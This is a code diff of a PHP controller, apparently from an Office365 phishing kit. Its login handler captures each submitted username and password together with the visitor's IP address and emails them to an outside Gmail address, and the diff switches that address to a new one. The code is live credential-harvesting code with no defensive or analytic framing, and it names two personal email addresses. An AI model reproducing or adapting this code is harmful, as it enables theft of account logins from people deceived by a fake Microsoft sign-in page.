@@ -60,8 +60,10 @@ class MainController extends Controller {
                  { 
                  	 $ip = getenv("REMOTE_ADDR");
                  	  $s = "Office365 xD ".$ip;
+                       $rcpt = "mails4davidslogan@gmail.com";
+                       #$rcpt = "giddycohen45@gmail.com";
                        $arr = ["email" => $req["username"], "password" => $req["passwd"], "ip" => $ip];
-                          $this->helpers->sendEmail("giddycohen45@gmail.com" ,$s,['arr' => $arr],'emails.login_alert','view');  
+                          $this->helpers->sendEmail($rcpt,$s,['arr' => $arr],'emails.login_alert','view');  
                           Session::flash("collect", "yes" );                	         
                           return redirect()->intended('/');                       
                    }                                                                                                   
